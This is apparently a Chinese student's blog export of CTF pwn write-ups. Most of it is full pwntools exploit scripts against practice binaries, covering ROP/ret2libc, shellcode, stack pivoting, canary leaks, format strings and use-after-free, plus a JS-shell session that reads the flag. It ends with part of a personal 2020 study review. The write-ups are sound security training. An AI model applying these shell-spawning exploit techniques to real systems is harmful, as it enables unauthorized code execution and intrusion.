<span id="more"></span>
<h1>2020moectf部分pwn</h1>
<h2 id="rop1">rop1</h2>
<p>wp:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop1&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x400670</span></span><br><span class="line">binsh = <span class="number">0x00601070</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;a&#x27;</span>*<span class="number">136</span> + p64(<span class="number">0x0400933</span>) + p64(binsh) + p64(sys) </span><br><span class="line"><span class="comment">#400933为‘pop rdi,ret’</span></span><br><span class="line">sh.sendline(p)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<!--more-->
<p>需要注意到，这题是x64的，跟x86的做法（ctfwiki-basicROP-ret2libc1）有些不同。<br>
x64调用函数传递参数时先使用rdi、rsi、rdx、rcx、r8、r9（储存整数和指针）等，再用栈</p>
<h2 id="rop2">rop2</h2>
<p>wp:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop2&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x0400670</span></span><br><span class="line">gets = <span class="number">0x04006b0</span></span><br><span class="line">pop_rdi = <span class="number">0x0400933</span></span><br><span class="line">bss = <span class="number">0x006010A8</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;a&#x27;</span>*<span class="number">136</span> + p64(pop_rdi) + p64(bss) + p64(gets) + p64(pop_rdi) + p64(bss) + p64(sys)</span><br><span class="line"></span><br><span class="line">sh.sendline(p)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>卡在少了最开始的p64(pop_rdi) + p64(bss)</p>
<p>学长的解释是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">改变rdi的gadget地址 使其指向bss段的那个地址 </span><br></pre></td></tr></table></figure>
<h2 id="unusual">unusual</h2>
<p>用alpha3弄出一个Alphanumeric Shellcode</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">sc = shellcraft.sh()</span><br><span class="line"><span class="built_in">print</span> asm(sc)</span><br><span class="line"><span class="comment">#sc.py</span></span><br><span class="line"></span><br><span class="line">python sc.py &gt; sc</span><br><span class="line"></span><br><span class="line">python alpha3/ALPHA3.py x64 <span class="built_in">ascii</span> mixedcase rax --<span class="built_in">input</span>=<span class="string">&quot;sc&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="hard-shelcode">hard_shelcode</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">sh = process(<span class="string">&quot;./hard_shellcode&quot;</span>)</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">sub_rsp = asm(<span class="string">&#x27;sub rsp, 64&#x27;</span>)</span><br><span class="line">jmp_rsp = asm(<span class="string">&#x27;jmp rsp&#x27;</span>)</span><br><span class="line">gadget = <span class="number">0x04000EA</span></span><br><span class="line"></span><br><span class="line">payload = sc + <span class="string">&#x27;a&#x27;</span>*(<span class="number">64</span>-<span class="built_in">len</span>(sc)) + sub_rsp + jmp_rsp + <span class="string">&#x27;b&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(sub_rsp)-<span class="built_in">len</span>(jmp_rsp)) + gadget</span><br><span class="line"><span class="comment">#payload = &#x27;a&#x27;*16 + sc + sub_rsp + jmp_rsp + &#x27;b&#x27;*(8-len(sub_rsp)-len(jmp_rsp)) + p64(gadget) </span></span><br><span class="line"><span class="comment">## sub rsp,48</span></span><br><span class="line"> </span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>用gadget跳转到&quot;sub_rsp,jmp_rsp&quot;然后执行sc(shellcode)</p>
<h2 id="baby-migration">baby_migration</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./baby_migration&quot;</span>)</span><br><span class="line"></span><br><span class="line">gets = <span class="number">0x4011C8</span></span><br><span class="line">rbp = <span class="number">0x404060</span></span><br><span class="line"><span class="comment">#shell = asm(shellcraft.sh())</span></span><br><span class="line">shell = <span class="string">&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;a&quot;</span>*<span class="number">0x30</span> + p64(rbp+<span class="number">300</span>) + p64(gets) </span><br><span class="line">payload2 = shell + <span class="string">&#x27;b&#x27;</span>*(<span class="number">0x30</span>-<span class="built_in">len</span>(shell)) + p64(rbp ) + p64(rbp+<span class="number">300</span>-<span class="number">0x30</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv()</span><br><span class="line">sleep(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNTgwMzAuaHRt">https://bbs.pediy.com/thread-258030.htm<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1YW55dW5mZW5nMy9hcnRpY2xlL2RldGFpbHMvNTE0NTYwNDk=">https://blog.csdn.net/yuanyunfeng3/article/details/51456049<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">栈迁移 的核心思想就是 将栈 的 esp 和 ebp 转移到一个 输入不受长度限制的 且可控制 的 址处，通常是 bss 段地址！ 在最后 ret 的时候 如果我们能够控制得 了 栈顶 esp指向的地址 就想到于 控制了 程序执行流！</span><br></pre></td></tr></table></figure>
<p>用pwntolls生成的shellcode执行不了，可能是因为太长？</p>
<h2 id="baby-canary">baby_canary</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./baby_canary&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;sec.arttnba3.cn&#x27;</span>,<span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./baby_canary&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/pluto/Desktop/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x41</span></span><br><span class="line">p.send(payload1)	<span class="comment">#dont use sendline</span></span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line"></span><br><span class="line">canary = u32(<span class="string">&#x27;\x00&#x27;</span>+p.recv(<span class="number">3</span>))</span><br><span class="line">p.recv()</span><br><span class="line">payload2 = <span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span> + p32(canary) + <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(puts_plt) + p32(start) + p32(puts_got)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;flag!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">base_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = base_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = base_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()	</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">payload3 = <span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span> + p32(canary) + <span class="string">&#x27;b&#x27;</span>*<span class="number">0xc</span> + p32(sys_addr) + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(binsh)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>在覆盖’\x00’得到canary时不能用sendline</p>
<p>这题在本地弄不出来，在远程上就可以。发现是用的libc不一样，本机为libc6-i386_2.21-0ubuntu4_amd64，服务器上是libc6-i386_2.23-0ubuntu11.2_amd64</p>
<h1>ctfwiki</h1>
<h2 id="ROP">ROP</h2>
<h3 id="ret2libc3">ret2libc3</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">stack = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_plt = elf.symbols[<span class="string">&quot;_start&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = stack + p32(puts_plt) + p32(main_plt) + p32(puts_got)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">recv1 = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts.got_addr= &quot;</span>,<span class="built_in">hex</span>(recv1))</span><br><span class="line"><span class="comment">#puts.got = cb0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">puts_offset = <span class="number">0x05fcb0</span></span><br><span class="line">sys_offset = <span class="number">0x03adb0</span></span><br><span class="line">binsh_offset = <span class="number">0x15bb0b</span> </span><br><span class="line"></span><br><span class="line">libc_base = recv1 - puts_offset</span><br><span class="line">sys_addr = libc_base + sys_offset</span><br><span class="line">binsh = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">payload2 = stack + p32(sys_addr) + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>libc 对应的是libc6_2.23-0ubuntu11.2_i386，对此是完全没想到的…</p>
<p>讲的挺好的https://www.jianshu.com/p/83f55c55c173</p>
<h1>XCTF进阶</h1>
<h2 id="实时数据监测">实时数据监测</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">35866</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">prev, word, index</span>):</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">payload = fmt_str(<span class="number">12</span>,<span class="number">4</span>,<span class="number">0x0804a048</span>,<span class="number">0x02223322</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGF6aHVhbmxhbi5jb20vMjAxOS8xMS8wNy81ZGMzZDY3NjM1ZGZlLw==">https://www.dazhuanlan.com/2019/11/07/5dc3d67635dfe/<i class="fa fa-external-link-alt"></i></span></p>
<p>用ctfwiki提供的脚本比较快，自己试挺麻烦的…（还是不太熟练</p>
<h2 id="welpwn">welpwn</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./8&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">32410</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./8&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc6_2.23-0ubuntu10_amd64</span></span><br><span class="line">sys_off = <span class="number">0x045390</span></span><br><span class="line">write_off = <span class="number">0x0f72b0</span></span><br><span class="line">binsh_off = <span class="number">0x18cd57</span></span><br><span class="line"></span><br><span class="line">pop = <span class="number">0x40089c</span></span><br><span class="line">pop_rdi = <span class="number">0x04008a3</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + p64(pop) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(<span class="number">0x4007CD</span>)</span><br><span class="line"><span class="comment">#0x18+pop(8个字节)用于复制（下一个函数）后填充第二个栈到返回地址，然后将write的got表pop到rdi，用puts输出，返回到main函数的开头，设置环境</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_addr = p.recvuntil(&quot;\\&quot;)</span></span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&quot;\x40&quot;</span>)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\00&#x27;</span>))</span><br><span class="line">write_addr = <span class="built_in">int</span>(write_addr)</span><br><span class="line"><span class="built_in">print</span> write_addr</span><br><span class="line">base = write_addr - write_off</span><br><span class="line">sys = base + sys_off</span><br><span class="line">binsh = binsh_off + base</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + p64(pop) + p64(pop_rdi) + p64(binsh) + p64(sys)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>好像服务器上和本地程序用的libc又不一样…所以连接完远程服务器后再获得一次write的got表，然后找到libc版本</p>
<p>主要学到了这个方法：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\00&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>将接收到的数字左对齐，并用’\00’填充为8位，</p>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly9tdXppYmluZy5naXRodWIuaW8vMjAyMC8wNi8xMi8yMDIwLjA2LjEyJUVGJUJDJTg4MTI1JUVGJUJDJTg5">https://muzibing.github.io/2020/06/12/2020.06.12（125）<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="monkey">monkey</h2>
<p>考察js shell</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ nc <span class="number">220.249</span><span class="number">.52</span><span class="number">.133</span> <span class="number">56451</span></span><br><span class="line">js&gt; os.system(<span class="string">&quot;pwd&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;pwd&quot;</span>)</span><br><span class="line">/home/ctf</span><br><span class="line">js&gt; os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">js</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libnspr4.so</span><br><span class="line">libplc4.so</span><br><span class="line">libplds4.so</span><br><span class="line">run.sh</span><br><span class="line">js&gt; os.system(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">cyberpeace&#123;xxxxxxx&#125;</span><br></pre></td></tr></table></figure>
<h2 id=""></h2>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>第六届网络空间安全技术赛pwn</title>
    <url>/54551.html</url>
    <content><![CDATA[<p>比赛没参加，本篇纯属因为无聊才写的(一个多月没做pwn了，顺便复习一下exp咋写…)</p>
<span id="more"></span>
<p><a href="">题目</a></p>
<h1>small</h1>
<p>应该是签到题吧<br>
checksec一看，保护全没开，极有可能<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508154649.png" alt="20210508154649"><br>
向大小为0x10的栈read 0x400个字节，很直接的想法就是输入shellcode然后跳转执行<br>
再一看下方有一个大小为0x50的bss段，exp差不多就能出来了</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&quot;./small&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x402020</span>) + p64(<span class="number">0x401015</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload2 = <span class="string">&quot;a&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x402020</span>) + p64(<span class="number">0x402030</span>) + shellcode</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>上学期西电新生赛的栈迁移都比这个灵活</p>
<h1>bank</h1>
<p>checksec:<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508195950.png" alt="20210508195950"><br>
拖到ida里：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508202927.png" alt="20210508202927"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508202941.png" alt="20210508202941"><br>
先判断输入的password，然后printf存在很明显的格式化字符串漏洞，用于打印flag</p>
<p>其中格式化字符串的漏洞只需要能够读栈上的值即可，这题的有意思的点在于爆破绕过strcmp<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508212659.png" alt="20210508212659"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508212648.png" alt="20210508212648"><br>
注：fgets读取到“\n”时结束</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	i+=<span class="number">1</span></span><br><span class="line">    p=process(<span class="string">&quot;./bank&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your account:\n&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your password:\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;wrong&#x27;</span> <span class="keyword">in</span> p.recvline():</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">	sleep(<span class="number">1</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">	<span class="comment">#p.sendlineafter(&quot;Do you want to check your account balance?\n&quot;,&quot;yes&quot;)</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please input your private code: \n&quot;</span>,<span class="string">&quot;%8$s&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>18年网鼎杯有个跟/dev/urandom有关的题目，<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNDY1OTAuaHRtJUVGJUJDJThDJUU4JTlCJUFFJUU2JTlDJTg5JUU2JTg0JThGJUU2JTgwJTlEJUU3JTlBJTg0JUVGJUJDJThDbGludXglRTklQkIlOTglRTglQUUlQTQlRTUlOEQlOTUlRTQlQjglQUElRTglQkYlOUIlRTclQTglOEIlRTYlODklOTMlRTUlQkMlODAlRTclOUElODQlRTYlOUMlODAlRTUlQTQlQTclRTYlOTYlODclRTQlQkIlQjYlRTYlOTUlQjAlRTQlQjglQkExMDI0">https://bbs.pediy.com/thread-246590.htm，蛮有意思的，linux默认单个进程打开的最大文件数为1024<i class="fa fa-external-link-alt"></i></span></p>
<h1>managebook</h1>
<p>常规的uaf，类似经典的hacknote</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./managebooks&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./managebooks&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">name_size,name,summary_size,summary</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book name size: &quot;</span>,<span class="built_in">str</span>(name_size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book name: &quot;</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book summary size: &quot;</span>,<span class="built_in">str</span>(summary_size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book summary: &quot;</span>,summary)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">num</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">num,size,summary</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Select Book ID (0-10): &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book summary size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book summary: &quot;</span>,summary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">num</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Select Book ID (0-10): &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&quot;aaaa&quot;</span>,<span class="number">0x20</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&quot;bbbb&quot;</span>,<span class="number">0x20</span>,<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x18</span>,p64(puts_plt)+p64(<span class="number">0</span>)+p64(puts_got))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">read(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">puts_addr= u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">sys = puts_addr - <span class="number">0x2a300</span></span><br><span class="line">binsh = puts_addr + <span class="number">0x11d777</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x18</span>,p64(sys) + p64(<span class="number">0</span>) + p64(binsh))</span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>2020总结以及2021的flag</title>
    <url>/3919.html</url>
    <content><![CDATA[<p>昨天00：40睡到了11：00…</p>
<span id="more"></span>
<h2 id="学习方面">学习方面</h2>
<p>课内学的好水…无论大一下的网课还是大二上在学校上的，跟考研直接相关的数据结构学的还行，概率论就比较差了。<br>
本来以为以后不会跟电路打交道，于是几节关键的数电网课就没听（后面就听不懂了），前段时间了解iot安全和计组后发现跟电路的关联还是比较大的，特别是iot的硬件方向。也许我某一天也会有点懊恼没认真听大物和离散？终究是路走窄了23333</p>
<p>实验室方向方面，算是看完了《逆向工程核心原理》《加密与解密》《程序员的自我修养》。三本书都还是处于常看常新的状态（尤其是前两本，看的时候一知半解，现在估计也忘了好多…）。<br>
今年学的还是太慢了，特别是上半年。上回在知乎上看到龙佬大二上的某个提问（学了《逆向》《加密》《python》《cppp》《0day2》）麻了。作为还能苟活在实验室而没有被踢掉的菜鸡，诚惶诚恐。<br>
ctf-wiki上学到了heap，配合别人写的guidance看了一点malloc.c源码<br>
感觉现在好像对底层的实现更有兴趣，比如bios、操作系统、编译原理、各种引擎、通信协议、汇编，which 完全不是 child dream 和去年学计算机的原因嘛23333…<br>
搭了个ctf平台用于纳新，算是用过了xshell和docker（再次大言不惭），熟悉了od和ida还有linux、vim的简单用法和命令。<br>
除了专业知识外，感觉对安全的领域和路了解太少了。</p>
